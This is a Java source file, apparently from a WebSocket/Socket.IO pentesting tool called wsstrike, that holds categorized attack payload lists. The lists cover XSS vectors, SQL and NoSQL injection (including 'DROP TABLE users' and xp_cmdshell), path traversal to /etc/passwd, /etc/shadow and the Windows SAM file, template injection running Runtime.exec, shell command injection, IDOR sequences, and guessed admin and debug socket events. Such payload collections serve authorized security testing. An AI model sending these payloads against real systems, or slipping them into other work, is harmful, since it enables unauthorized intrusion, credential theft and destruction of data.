package wsstrike;

import java.util.*;

public class Payloads {

    public static final Map<String, List<String>> ALL = new LinkedHashMap<>();

    static {
        ALL.put("XSS", Arrays.asList(
            "<script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>",
            "'-alert(1)-'",
            "{{7*7}}",
            "${7*7}",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "<img src=x onerror=prompt(1)>",
            "\"><svg/onload=alert(document.domain)>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<details/open/ontoggle=alert(1)>",
            "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
            "\"><input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "'-alert(1)//",
            "\"><body onload=alert(1)>",
            "<isindex type=image src=1 onerror=alert(1)>",
            "\" onmouseover=\"alert(1)",
            "<video src=x onerror=alert(1)>",
            "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
        ));

        ALL.put("SQLi", Arrays.asList(
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"\"=\"",
            "' UNION SELECT NULL--",
            "' AND 1=2 UNION SELECT 1,2,3--",
            "1; DROP TABLE users--",
            "' OR 'x'='x",
            "admin'--",
            "1' ORDER BY 10--",
            "' AND SLEEP(5)--",
            "' AND 1=1--",
            "' AND 1=2--",
            "1' WAITFOR DELAY '0:0:5'--",
            "'; EXEC xp_cmdshell('whoami')--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
            "' OR EXISTS(SELECT * FROM users)--",
            "') OR ('1'='1",
            "admin' OR '1'='1'--",
            "' HAVING 1=1--"
        ));

        ALL.put("IDOR (1-50)", generateSequence(1, 50));
        ALL.put("IDOR (1-100)", generateSequence(1, 100));
        ALL.put("IDOR (1-500)", generateSequence(1, 500));

        ALL.put("Privilege Escalation", Arrays.asList(
            "admin", "superadmin", "root", "administrator",
            "moderator", "staff", "manager", "owner",
            "super_user", "system", "debug", "internal",
            "operator", "supervisor", "lead", "director",
            "1", "0", "true", "false"
        ));

        ALL.put("Boolean/Type Confusion", Arrays.asList(
            "true", "false", "1", "0", "null", "undefined", "",
            "[]", "{}", "NaN", "Infinity", "-1",
            "\"true\"", "\"false\"", "\"null\"", "\"0\"", "\"1\""
        ));

        ALL.put("Boundary Values", Arrays.asList(
            "0", "-1", "999999999", "-999999999",
            "2147483647", "-2147483648", "9999999999999999",
            "NaN", "Infinity", "-Infinity",
            "0.1", "0.0", "1e308", "1e-308",
            "", " ", "null", "undefined",
            "[]", "{}", "[[]]", "\"\"",
            String.valueOf(Long.MAX_VALUE),
            String.valueOf(Long.MIN_VALUE)
        ));

        ALL.put("Path Traversal", Arrays.asList(
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "..%252f..%252f..%252f",
            "..%c0%af..%c0%af",
            "/etc/passwd",
            "/etc/shadow",
            "C:\\Windows\\system32\\config\\SAM",
            "....\\....\\....\\etc\\passwd"
        ));

        ALL.put("Socket.IO Events", Arrays.asList(
            "admin:list_users", "admin:delete_user", "admin:create_user",
            "admin:update_role", "admin:export_data", "admin:reset_password",
            "admin:config", "admin:settings", "admin:logs",
            "debug:dump_config", "debug:eval", "debug:logs", "debug:trace",
            "internal:migrate", "internal:seed", "internal:backup",
            "system:shutdown", "system:restart", "system:status",
            "user:escalate", "user:impersonate", "user:ban",
            "chat:delete", "chat:edit", "chat:pin",
            "file:read", "file:write", "file:delete",
            "db:query", "db:exec", "db:dump"
        ));

        ALL.put("Socket.IO Namespaces", Arrays.asList(
            "/admin", "/debug", "/internal", "/system",
            "/api", "/v2", "/v3", "/staging", "/test",
            "/monitor", "/metrics", "/health", "/status",
            "/private", "/secret", "/management", "/control",
            "/dev", "/qa", "/production"
        ));

        ALL.put("NoSQLi", Arrays.asList(
            "{\"$gt\":\"\"}",
            "{\"$ne\":null}",
            "{\"$regex\":\".*\"}",
            "{\"$where\":\"sleep(5000)\"}",
            "true, $where: '1 == 1'",
            "{\"$gt\":0}",
            "{\"$exists\":true}",
            "[$ne]=1",
            "{\"$nin\":[]}",
            "{\"$or\":[{},{}]}"
        ));

        ALL.put("SSTI", Arrays.asList(
            "{{7*7}}", "${7*7}", "<%= 7*7 %>",
            "{{config}}", "{{self.__class__}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "#{7*7}", "{{constructor.constructor('return this')()}}",
            "{{request.application.__globals__}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}"
        ));

        ALL.put("Command Injection", Arrays.asList(
            "; whoami", "| whoami", "$(whoami)",
            "`whoami`", "& whoami", "&& whoami",
            "|| whoami", "\n whoami", "; id",
            "| id", "$(id)", "; cat /etc/passwd"
        ));
    }

    private static List<String> generateSequence(int start, int end) {
        List<String> list = new ArrayList<>();
        for (int i = start; i <= end; i++) {
            list.add(String.valueOf(i));
        }
        return list;
    }
}
